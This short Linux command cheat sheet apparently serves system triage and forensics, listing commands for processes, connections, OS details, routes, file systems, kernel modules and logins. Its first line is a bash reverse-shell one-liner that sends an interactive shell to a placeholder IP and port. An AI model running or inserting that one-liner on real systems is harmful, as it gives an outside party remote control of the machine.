bash -i >& /dev/tcp/IP/PORT 0>&1 //Reverse connection
list processes, PID's and connections ${ps -ef}
list connections ${netstat -tulpn}
Date and timezome ${date}
OS info ${uname -a} //Especially needed if memory forensics is about to be performed as the profile is OS and Kernel dependent
Network interface information ${ifconfig -a}
Network connections/Open ports ${netstat -tulpn} or ${netstat -anp}
Running processes ${ps -ef} or ${ps aux}
Routing tables ${route}
File systems ${df -h}
Kernel modules ${lsmod}
Users ${w}, ${last}, ${lastb}
